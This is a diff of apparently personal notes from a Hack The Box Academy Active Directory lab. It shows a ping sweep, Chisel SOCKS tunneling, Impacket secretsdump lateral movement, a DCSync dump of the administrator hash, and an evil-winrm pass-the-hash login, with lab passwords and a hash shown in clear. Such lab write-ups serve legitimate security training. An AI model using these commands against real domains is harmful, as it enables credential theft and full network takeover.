@@ -6,11 +6,11 @@ PS> 1..254 | % {echo "172.16.6.$_"; ping -n 1 -w 100 172.16.6.$_} | Select-Strin
 
 ```
 
-Reply from 172.16.6.3: bytes=32 time<1ms TTL=128
-Reply from 172.16.6.50: bytes=32 time<1ms TTL=128
+Reply from 172.16.6.3: bytes=32 time<1ms TTL=128     Administrator Desktop on DC01
+Reply from 172.16.6.50: bytes=32 time<1ms TTL=128    svc_sql's desktop MS01
 Reply from 172.16.6.100: bytes=32 time<1ms TTL=128
 
-Chisel from HTB academy - SOCKS5 Tunneling with Chisel
+### Chisel from HTB academy - SOCKS5 Tunneling with Chisel
 ```
 socks4        127.0.0.1 9050
 OR
@@ -28,6 +28,12 @@ proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
 
 ```
 
+### or use secretdump to get another user's hash(Lateral movement)
+
+```
+proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/svc_sql:"lucky7"@172.16.6.50
+```
+
         wdigest :
          * Username : tpetty
          * Domain   : INLANEFREIGHT
@@ -37,14 +43,13 @@ proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7
          * Domain   : INLANEFREIGHT.LOCAL
          * Password : Sup3rS3cur3D0m@inU2eR
 
-`proxychains evil-winrm -i 172.16.6.50 -u tpetty -p Sup3rS3cur3D0m@inU2eR`
 
+### Get the final administrator's hash by dsync attack
+```
+proxychains /usr/share/doc/python3-impacket/examples/secretsdump.py INLANEFREIGHT/tpetty:"Sup3rS3cur3D0m@inU2eR"@172.16.6.3 -just-dc-user INLANEFREIGHT/administrator
 ```
 
-.\mimikatz.exe lsadump::dcsync /user:INLANEFREIGHT\tpetty exit
-.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\tpetty exit
-.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:tpetty exit
-.\mimikatz.exe lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:Administrator exit
-
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL	Impacket tool used to perform a DCSync attack and retrieve one or all of the NTLM password hashes from the target Windows domain. Performed from a Linux-based host.
+### Login
+```
+proxychains evil-winrm -i 172.16.6.3 -u Administrator -H 27dedb1dab4d8545c6e1c66fba077da0
 ```
